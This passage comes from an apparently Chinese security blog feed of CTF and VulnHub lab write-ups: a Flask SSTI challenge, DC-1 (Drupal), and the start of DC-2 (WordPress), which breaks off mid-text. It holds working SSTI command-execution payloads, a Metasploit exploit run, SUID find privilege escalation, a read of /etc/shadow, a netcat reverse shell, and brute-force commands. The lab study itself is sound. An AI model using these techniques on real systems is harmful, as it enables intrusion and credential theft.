&#x27;werkzeug.urls.Href&#x27;</span><br><span class="line">193. type &#x27;select.epoll&#x27;</span><br><span class="line">194. class &#x27;click._compat._FixupStream&#x27;</span><br><span class="line">195. class &#x27;click._compat._AtomicFile&#x27;</span><br><span class="line">196. class &#x27;click.utils.LazyFile&#x27;</span><br><span class="line">197. class &#x27;click.utils.KeepOpenFile&#x27;</span><br><span class="line">198. class &#x27;click.utils.PacifyFlushWrapper&#x27;</span><br><span class="line">199. class &#x27;click.parser.Option&#x27;</span><br><span class="line">200. class &#x27;click.parser.Argument&#x27;</span><br><span class="line">201. class &#x27;click.parser.ParsingState&#x27;</span><br><span class="line">202. class &#x27;click.parser.OptionParser&#x27;</span><br><span class="line">203. class &#x27;click.types.ParamType&#x27;</span><br><span class="line">204. class &#x27;click.formatting.HelpFormatter&#x27;</span><br><span class="line">205. class &#x27;click.core.Context&#x27;</span><br><span class="line">206. class &#x27;click.core.BaseCommand&#x27;</span><br><span class="line">207. class &#x27;click.core.Parameter&#x27;</span><br><span class="line">208. class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span><br><span class="line">209. class &#x27;werkzeug.serving._SSLContext&#x27;</span><br><span class="line">210. class &#x27;werkzeug.serving.BaseWSGIServer&#x27;</span><br><span class="line">211. class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span><br><span class="line">212. class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span><br><span class="line">213. class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span><br><span class="line">214. class &#x27;werkzeug.datastructures.ViewItems&#x27;</span><br><span class="line">215. class &#x27;werkzeug.datastructures._omd_bucket&#x27;</span><br><span class="line">216. class &#x27;werkzeug.datastructures.Headers&#x27;</span><br><span class="line">217. class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span><br><span class="line">218. class &#x27;werkzeug.datastructures.IfRange&#x27;</span><br><span class="line">219. class &#x27;werkzeug.datastructures.Range&#x27;</span><br><span class="line">220. class &#x27;werkzeug.datastructures.ContentRange&#x27;</span><br><span class="line">221. class &#x27;werkzeug.datastructures.FileStorage&#x27;</span><br><span class="line">222. class &#x27;email.LazyImporter&#x27;</span><br><span class="line">223. class &#x27;calendar.Calendar&#x27;</span><br><span class="line">224. class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span><br><span class="line">225. class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span><br><span class="line">226. class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span><br><span class="line">227. class &#x27;werkzeug.wsgi.ClosingIterator&#x27;</span><br><span class="line">228. class &#x27;werkzeug.wsgi.FileWrapper&#x27;</span><br><span class="line">229. class &#x27;werkzeug.wsgi._RangeWrapper&#x27;</span><br><span class="line">230. class &#x27;werkzeug.formparser.FormDataParser&#x27;</span><br><span class="line">231. class &#x27;werkzeug.formparser.MultiPartParser&#x27;</span><br><span class="line">232. class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span><br><span class="line">233. class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span><br><span class="line">234. class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span><br><span class="line">235. class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span><br><span class="line">236. class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span><br><span class="line">237. class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span><br><span class="line">238. class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;</span><br><span class="line">239. class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;</span><br><span class="line">240. class &#x27;werkzeug.useragents.UserAgentParser&#x27;</span><br><span class="line">241. class &#x27;werkzeug.useragents.UserAgent&#x27;</span><br><span class="line">242. class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span><br><span class="line">243. class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span><br><span class="line">244. class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span><br><span class="line">245. class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span><br><span class="line">246. class &#x27;werkzeug.test._TestCookieHeaders&#x27;</span><br><span class="line">247. class &#x27;werkzeug.test._TestCookieResponse&#x27;</span><br><span class="line">248. class &#x27;werkzeug.test.EnvironBuilder&#x27;</span><br><span class="line">249. class &#x27;werkzeug.test.Client&#x27;</span><br><span class="line">250. class &#x27;uuid.UUID&#x27;</span><br><span class="line">251. type &#x27;CArgObject&#x27;</span><br><span class="line">252. type &#x27;_ctypes.CThunkObject&#x27;</span><br><span class="line">253. type &#x27;_ctypes._CData&#x27;</span><br><span class="line">254. type &#x27;_ctypes.CField&#x27;</span><br><span class="line">255. type &#x27;_ctypes.DictRemover&#x27;</span><br><span class="line">256. class &#x27;ctypes.CDLL&#x27;</span><br><span class="line">257. class &#x27;ctypes.LibraryLoader&#x27;</span><br><span class="line">258. class &#x27;subprocess.Popen&#x27;</span><br><span class="line">259. class &#x27;itsdangerous._json._CompactJSON&#x27;</span><br><span class="line">260. class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span><br><span class="line">261. class &#x27;itsdangerous.signer.Signer&#x27;</span><br><span class="line">262. class &#x27;itsdangerous.serializer.Serializer&#x27;</span><br><span class="line">263. class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span><br><span class="line">264. class &#x27;flask._compat._DeprecatedBool&#x27;</span><br><span class="line">265. class &#x27;werkzeug.local.Local&#x27;</span><br><span class="line">266. class &#x27;werkzeug.local.LocalStack&#x27;</span><br><span class="line">267. class &#x27;werkzeug.local.LocalManager&#x27;</span><br><span class="line">268. class &#x27;werkzeug.local.LocalProxy&#x27;</span><br><span class="line">269. class &#x27;difflib.HtmlDiff&#x27;</span><br><span class="line">270. class &#x27;werkzeug.routing.RuleFactory&#x27;</span><br><span class="line">271. class &#x27;werkzeug.routing.RuleTemplate&#x27;</span><br><span class="line">272. class &#x27;werkzeug.routing.BaseConverter&#x27;</span><br><span class="line">273. class &#x27;werkzeug.routing.Map&#x27;</span><br><span class="line">274. class &#x27;werkzeug.routing.MapAdapter&#x27;</span><br><span class="line">275. class &#x27;flask.signals.Namespace&#x27;</span><br><span class="line">276. class &#x27;flask.signals._FakeSignal&#x27;</span><br><span class="line">277. class &#x27;flask.helpers.locked_cached_property&#x27;</span><br><span class="line">278. class &#x27;flask.helpers._PackageBoundObject&#x27;</span><br><span class="line">279. class &#x27;flask.cli.DispatchingApp&#x27;</span><br><span class="line">280. class &#x27;flask.cli.ScriptInfo&#x27;</span><br><span class="line">281. class &#x27;flask.config.ConfigAttribute&#x27;</span><br><span class="line">282. class &#x27;flask.ctx._AppCtxGlobals&#x27;</span><br><span class="line">283. class &#x27;flask.ctx.AppContext&#x27;</span><br><span class="line">284. class &#x27;flask.ctx.RequestContext&#x27;</span><br><span class="line">285. class &#x27;flask.json.tag.JSONTag&#x27;</span><br><span class="line">286. class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span><br><span class="line">287. class &#x27;flask.sessions.SessionInterface&#x27;</span><br><span class="line">288. class &#x27;werkzeug.wrappers.json._JSONModule&#x27;</span><br><span class="line">289. class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span><br><span class="line">290. class &#x27;flask.blueprints.BlueprintSetupState&#x27;</span><br><span class="line">291. type &#x27;unicodedata.UCD&#x27;</span><br><span class="line">292. class &#x27;jinja2.ext.Extension&#x27;</span><br><span class="line">293. class &#x27;jinja2.ext._CommentFinder&#x27;</span><br><span class="line">294. type &#x27;array.array&#x27;</span><br><span class="line">295. type &#x27;method-wrapper&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这里可以使用59, 71, 40</p>
<p>经过测试，后台过滤了global。</p>
<h2 id="命令执行">命令执行</h2>
<h3 id="site._printer"><code>site._Printer</code></h3>
<p>首先查看是否内置os模块。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在页面中找到如下内容：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png" /></p>
<p>发现内置了os模块，因此直接引用，然后执行系统命令即可。</p>
<p>查看当前目录和根目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png" /></p>
<p>发现当前目录就是根目录，那么现在就需要找flag文件。起初使用<code>find / -name 'flag*'</code>，发现没有收获，如果通过查找内容的话<code>grep -r -i 'flag'</code>，时间太长导致无响应包。因此只能一个一个文件慢慢找，不过有一个目录叫做<code>flasklight</code>，因此先找它。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png" /></p>
<p>第二个看过去像是一个flag文件，先用下面payload查看文件类型：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;file /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png" /></p>
<p>发现是一个文本文件，因此直接读取其内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png" /></p>
<h3
id="warnings.catch_warnings"><code>warnings.catch_warnings</code></h3>
<p>查看是否内置os模块： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png" /></p>
<p>只找到了这么一处，说明没有内置os，因此需要导入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png" /></p>
<h2 id="文件包含-file">文件包含-<code>file</code></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png" /></p>
<h1 id="总结">总结</h1>
<p>这道题让我感觉到了两处薄弱项：</p>
<ol type="1">
<li>不知道有哪些类可以利用</li>
<li>遇上过滤，不知如何绕过</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1 Writeup</title>
    <url>/2022/05/10/DC-1%20Writeup/</url>
    <content><![CDATA[<p>靶机难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到5个flag</li>
</ul>
<h1 id="渗透">渗透</h1>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.35</span><br><span class="line">sudo nmap -p22,80,111,49821 -A 10.0.2.35</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113213.png" /></p>
<h2 id="http服务-get-shell">http服务 + get shell</h2>
<p>直接访问80端口，是一个登录界面，可以看到CMS是drupal。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113303.png" /></p>
<p>这里我尝试了弱口令和爆破，结果IP被封了。。。。。</p>
<p>没办法，查看robots.txt，得到许多路径信息，但是大部分都没用，不过还是从
/MAINTAINERS.txt 中知道了drupal的版本应该&gt;=7</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113459.png" /></p>
<p>直接搜索该CMS是否有可利用的漏洞，发现还不少。并且有一些可以直接在metasplit中使用，因此先尝试这些exploit</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113546.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113720.png" /></p>
<p>从 Rank 为 excellent 且最新的漏洞开始尝试，也就是第2个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use 1</span><br><span class="line">2. show options</span><br><span class="line">3. set rhost 10.0.2.35</span><br><span class="line">4. run</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510113918.png" /></p>
<p>打开shell，并用python进行简单升级 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shell</span><br><span class="line">2. which python</span><br><span class="line">3. python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114053.png" /></p>
<h2 id="权限提升">权限提升</h2>
<h3 id="方法1-简单">方法1-简单</h3>
<p>首先进行常规的信息收集，但在找suid权限的文件的时候看到了可疑的文件：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114249.png" /></p>
<p>Linux中 find 命令可以利用 -exec
命令执行其他系统命令，因此可以使用下面的命令进行提权： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510114352.png" /></p>
<p>接下来直接读取flag即可，但是有一个现在还读不到。</p>
<blockquote>
<p>注意：这里只能使用/bin/sh提权，而不能使用/bin/bash，不知道为什么。</p>
</blockquote>
<h3 id="方法2-常规">方法2-常规</h3>
<p>得到www-data的shell之后，在当前目录找到了第一个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat flag1.txt</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure></p>
<p>这个flag其实是一个提示，大致的意思：“好的CMS都需要一个配置文件，你也需要”。因此解析来需要去找配置文件。</p>
<p>最开始还以为是当前目录的web-config，结果查看之后并不是，反而解释了为什么很多文件访问都是403，因为该文件做了过滤。</p>
<p>最终在/var/www/sites/default目录下找到了配置文件settings.php，查看该文件，取出最终要的内容：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">&#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">&#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">&#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">&#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">&#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">&#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$drupal_hash_salt = &#x27;X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>得到flag2，大致意思为：“暴力破解不是访问的唯一方法，但是你需要访问它，你能利用这些信息做些什么呢？”</p>
<p>利用得到的信息登录数据库，查看drupaldb数据库的users表的信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115232.png" /></p>
<p>从中找到3个用户信息，其中有一个是我测试http功能点的时候创建的。密码字段像是加密过的，并且盐很可能就是配置信息中给出的那个。但是根据flag2，不需要暴力破解，那么就使用mysql修改admin的密码。</p>
<p>但我们现在还不知道加密算法，因此继续寻找，最终在/var/www/scripts中找到文件
password-hash.sh
，这看过去就像是密码的加密算法，查看其内容了解使用方法：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115722.png" /></p>
<p>没想到后缀为sh，居然使用php执行。但是直接执行该文件失败了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510115951.png" /></p>
<p>查看报错信息，找到对应的源码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120048.png" /></p>
<p>/var/www/scripts目录下并没有这两个文件，而/var/www目录下才有。因此其实有两种方法：第一种就是修改这两行代码，改成绝对路径（理论上可以，我没尝试过）；第二种就是回到/var/www目录执行。</p>
<p>显然使用第二种 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line">php scripts/password-hash.sh <span class="string">&quot;m1ku&quot;</span></span><br><span class="line"></span><br><span class="line">password: m1ku   <span class="built_in">hash</span>: $S<span class="variable">$DYr4</span>.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT</span><br></pre></td></tr></table></figure></p>
<p>然后再次连接mysql，修改admin的密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use drupaldb</span><br><span class="line">2. update users set pass=&quot;$S$DYr4.WSBz9SbiPmKx1nlpq1UD6EQQMvJg8Ti1.Q1jXgm8q76aeOT&quot; where uid=1;</span><br></pre></td></tr></table></figure></p>
<p>回到网站，使用刚刚修改的密码登录admin，登录进去之后点击左上角的
Dashboard找到</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510120639.png" /></p>
<p>查看flag3（） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure></p>
<p>大致意思为：“特殊的权限将会帮助你找到密码，但是你需要知道如何使用
-exec 命令去获得 shadow 中的信息”。其实提示很明显了，perms, find, -exec,
passwd, shadow 都是Linux中的。</p>
<p>因此，接下来使用下面命令读取/etc/shadow中的信息 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> cat /etc/shadow \; <span class="comment"># 最好到一个文件不多的目录，否则会重复好多次</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::</span><br><span class="line">daemon:*:17946:0:99999:7:::</span><br><span class="line">bin:*:17946:0:99999:7:::</span><br><span class="line">sys:*:17946:0:99999:7:::</span><br><span class="line">sync:*:17946:0:99999:7:::</span><br><span class="line">games:*:17946:0:99999:7:::</span><br><span class="line">man:*:17946:0:99999:7:::</span><br><span class="line">lp:*:17946:0:99999:7:::</span><br><span class="line">mail:*:17946:0:99999:7:::</span><br><span class="line">news:*:17946:0:99999:7:::</span><br><span class="line">uucp:*:17946:0:99999:7:::</span><br><span class="line">proxy:*:17946:0:99999:7:::</span><br><span class="line">www-data:*:17946:0:99999:7:::</span><br><span class="line">backup:*:17946:0:99999:7:::</span><br><span class="line">list:*:17946:0:99999:7:::</span><br><span class="line">irc:*:17946:0:99999:7:::</span><br><span class="line">gnats:*:17946:0:99999:7:::</span><br><span class="line">nobody:*:17946:0:99999:7:::</span><br><span class="line">libuuid:!:17946:0:99999:7:::</span><br><span class="line">Debian-exim:!:17946:0:99999:7:::</span><br><span class="line">statd:*:17946:0:99999:7:::</span><br><span class="line">messagebus:*:17946:0:99999:7:::</span><br><span class="line">sshd:*:17946:0:99999:7:::</span><br><span class="line">mysql:!:17946:0:99999:7:::</span><br><span class="line">flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
<p>其中flag4和root的密码都是加密过的，可以使用john爆破，root没爆破出来，但是flag4的可以直接爆破。（也可以使用hydra直接ssh连接爆破flag4）最终得到的明文密码为
orange。利用该密码登录flag4，在家目录找到flag4 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br></pre></td></tr></table></figure></p>
<p>获取root权限还是使用find，这里使用另一个命令 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -<span class="built_in">exec</span> nc 10.0.2.4 5555 -e /bin/bash \;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220510122415.png" /></p>
<p>最后，读取第5个flag，/root/fonalflag.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>该靶机难度比较简单，涉及如下知识点：</p>
<ol type="1">
<li>suid提权-find提权</li>
<li>数据库常见命令</li>
<li>信息收集能力</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>suid提权-find</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2 Writeup</title>
    <url>/2022/05/11/DC-2%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到5个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.36</span><br><span class="line">sudo nmap -p80,77444 -A 10.0.2.36</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511104025.png" /></p>
<p>这里 7744 端口上的服务为ssh。</p>
<h2 id="外围">2.2. 外围</h2>
<p>直接访问80端口，发现被重定向到dc-2，因此将该域名添加到
/etc/hosts，然后直接访问该域名。从其中找到第一个flag，并且得到提示信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511111749.png" /></p>
<p>flag1大致意思：“平常使用的字典可能不起作用，你可能需要cewl。在很多时候，字典越大越好，但是有时候大字典也没有用。登录其中某个账号就可以看到下一个flag。如果没看到下一个flag，说明你登陆了另一个账号”</p>
<ol type="1">
<li>首先是 cewl，我们需要利用该工具定制字典；</li>
<li>有两个账号；其中一个可以看到flag，另一个则看不到；</li>
</ol>
<p>接下来先进行路径扫描，看一下是否有后台登录地址： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://dc-2/ </span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511143602.png" /></p>
<p>一一访问之后，只有/wp-admin和/wp-login.php有信息，并且是一个后台登录界面。</p>
<p>接下来使用 wpscan 来枚举以下用户。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511142907.png" /></p>
<p>找到三个用户：admin, jerry,
tom。将这三个用户名写入users.txt。然后使用cewl定制字典：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w pass.txt</span><br></pre></td></tr></table></figure></p>
<p>最后，直接使用 wpscan 爆破即可： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P pass.txt</span><br></pre></td></tr></table></figure></p>
<p>结果爆破出两个用户的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure></p>
<p>分别登录后台，只有 jerry 才可以看到第二个flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511143814.png" /></p>
<p>第二个flag的大致意思：“如果你无法通过WordPress获得捷径，那就使用另一个方法，祝你找到另一个攻入的点”</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>我在后台找了半天，找到文件上传的功能点，但是没有写权限，所以无法上传。也没有找到任何模板文件，因此尝试另一个方法。</p>
<p>思路回到刚刚端口扫描，7744端口开放了ssh，尝试使用刚刚爆破得到的用户和密码登录ssh，利用tom用户成功登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144225.png" /></p>
<p>一登录就遇到一个问题，当我们输入命令的时候，跳出了 rbash
字样，说明当前用户的shell不是完整的，接下来进行[[rbash 逃逸]]。</p>
<p>获得完整的shell之后，在当前目录下看到了第三个flag，但是又出现了问题，直接输入cat，提示
command not
found。一般cat的路径为/bin/cat，这样之后就可以了，猜测应该是环境变量的问题，为了接下来的操作方便，先暂时添加以下环境变量：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511144619.png" /></p>
<p>然后读取第三个flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br></pre></td></tr></table></figure></p>
<p>大致意思：“可怜的tom总是追不到Jerry。可能它需要su掉所有的压力”，<strong>这里的su就很灵性</strong>。</p>
<p>首先查看一下有哪些用户 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img
